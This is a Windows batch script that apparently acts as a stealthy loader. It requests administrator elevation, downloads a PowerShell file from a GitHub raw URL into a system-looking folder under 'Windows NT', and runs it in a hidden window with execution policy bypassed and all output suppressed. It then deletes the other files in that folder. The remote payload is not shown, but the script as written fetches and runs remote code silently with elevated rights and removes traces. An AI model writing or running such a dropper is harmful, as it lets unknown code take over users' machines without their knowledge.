@echo off
:: Check if the script is run as Administrator
:: If not, request elevation by relaunching the script with administrative privileges

:: Check if the script is running as administrator
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs" >nul 2>&1
    exit /b
)

:: Download system.ps1 from the updated URL
set sysPs1URL=https://raw.githubusercontent.com/quannqttg/coccoc/main/system.ps1
set sysPs1Path="C:\Program Files\Windows NT\ADB\system.ps1"

:: Check if system.ps1 already exists and delete it if it does
if exist %sysPs1Path% (
    del /f /q %sysPs1Path% >nul 2>&1
)

:: Download the system.ps1 file
curl -L -o %sysPs1Path% %sysPs1URL% >nul 2>&1
if %errorlevel% neq 0 (
    exit /b
)

:: Run system.ps1 using PowerShell with ExecutionPolicy Bypass
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %sysPs1Path% >nul 2>&1
if %errorlevel% neq 0 (
    exit /b
)

:: Delete all files except system.bat
for %%F in ("C:\Program Files\Windows NT\ADB\*") do (
    if /i "%%~nxF" neq "system.bat" (
        del /f /q "%%F" >nul 2>&1
    )
)

:: Exit the batch file
exit /b
